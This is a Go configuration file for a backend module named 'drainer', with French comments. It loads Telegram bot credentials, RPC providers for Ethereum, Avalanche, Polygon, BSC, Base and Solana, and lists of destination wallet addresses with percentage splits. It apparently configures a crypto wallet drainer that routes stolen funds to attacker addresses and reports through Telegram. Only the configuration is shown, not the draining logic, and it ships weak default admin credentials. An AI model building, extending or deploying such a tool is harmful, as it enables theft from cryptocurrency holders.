package config

import (
	"log"
	"os"

	"drainer/internal/model"
)

// Config regroupe toute la configuration chargée depuis l'environnement.
type Config struct {
	Port          string
	GinMode       string
	JWTSecret     []byte
	AdminUsername string
	AdminPassword string

	TelegramToken  string
	TelegramChatID string

	AllowedOrigins []string

	EVMChains []model.ChainEvm
	SolChains []model.ChainSol
	EVMAddrs  []model.EvmAddress
	SolAddrs  []model.SolAddress
	PriceEth  []model.GetEthPrice
	PriceSol  []model.GetSolPrice
}

func Load() *Config {
	cfg := &Config{
		Port:          env("PORT", "8080"),
		GinMode:       env("GIN_MODE", "release"),
		JWTSecret:     []byte(env("JWT_SECRET", "change-me-in-production")),
		AdminUsername: env("ADMIN_USERNAME", "admin"),
		AdminPassword: env("ADMIN_PASSWORD", "admin123"),

		TelegramToken:  env("TELEGRAM_BOT_TOKEN", ""),
		TelegramChatID: env("TELEGRAM_CHAT_ID", ""),

		AllowedOrigins: []string{
			env("CORS_ORIGIN_1", "http://localhost:3000"),
			env("CORS_ORIGIN_2", "http://172.20.167.237:3000"),
		},

		EVMChains: []model.ChainEvm{
			{ID: "1", Provider: env("ETH_PROVIDER", "")},
			{ID: "43114", Provider: env("AVAX_PROVIDER", "")},
			{ID: "137", Provider: env("POLY_PROVIDER", "")},
			{ID: "56", Provider: env("BSC_PROVIDER", "")},
			{ID: "8453", Provider: env("BASE_PROVIDER", "")},
		},
		SolChains: []model.ChainSol{
			{SolProvider: env("SOL_PROVIDER", "")},
		},

		EVMAddrs: []model.EvmAddress{
			{ID: "1", EthAddress: env("EVM_ADDR_1", "0x11111111111111111111111111111"), Percent: 50},
			{ID: "2", EthAddress: env("EVM_ADDR_2", "0x22222222222222222222222222222"), Percent: 50},
		},
		SolAddrs: []model.SolAddress{
			{ID: "1", SolAddress: env("SOL_ADDR_1", "11111111111111111111111111111111"), Percent: 60},
			{ID: "2", SolAddress: env("SOL_ADDR_2", "11111111111111111111111111111112"), Percent: 40},
		},

		PriceEth: []model.GetEthPrice{
			{EthPrice: "https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd"},
		},
		PriceSol: []model.GetSolPrice{
			{SolPrice: "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd"},
		},
	}

	cfg.warn()
	return cfg
}

// warn émet des avertissements si des variables critiques sont absentes.
func (c *Config) warn() {
	if c.TelegramToken == "" {
		log.Println("WARNING: TELEGRAM_BOT_TOKEN non défini")
	}
	if c.TelegramChatID == "" {
		log.Println("WARNING: TELEGRAM_CHAT_ID non défini")
	}
	if string(c.JWTSecret) == "change-me-in-production" {
		log.Println("WARNING: JWT_SECRET utilise la valeur par défaut — changez-la en production")
	}
}

func env(key, fallback string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return fallback
}
